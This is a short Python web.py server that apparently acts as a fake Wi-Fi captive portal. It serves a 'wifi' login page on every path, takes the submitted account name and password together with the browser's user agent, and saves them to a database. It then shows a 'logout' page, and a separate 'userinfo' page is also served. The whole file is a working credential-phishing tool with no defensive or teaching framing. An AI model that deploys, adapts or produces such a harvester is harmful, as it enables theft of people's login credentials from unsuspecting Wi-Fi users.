# encoding=utf-8
import web
import SQL
urls=('/Control(.*)','login',
      '/logout(.*)','logout',
      '/notice','notice',
      '/userinfo','userinfo',
      '/(.*)','index'
      )
temp=web.template.render('temp')
app=web.application(urls,globals())
class notice:
    def GET(self):
        return temp.notice()
class index:
    def GET(self,name):
        return temp.wifi()
    def POST(self,name):
        return temp.wifi()
class login:
    def GET(self,u):
        username=web.input().get('username')
        return temp.logout(username)
    def POST(self,u):
        headers=web.ctx.env.get('HTTP_USER_AGENT')
        userdata=web.input()
        name=userdata.get('strAccount')
        pwd=userdata.get('strPassword')
        #print(u'账号:%s\t|密码:%s'%(name,pwd))
        SQL.insertinfo(name,pwd,headers)
        return temp.logout(name)
class userinfo:
    def GET(self):
        return temp.userinfo()
if __name__ == '__main__':
    app.run()
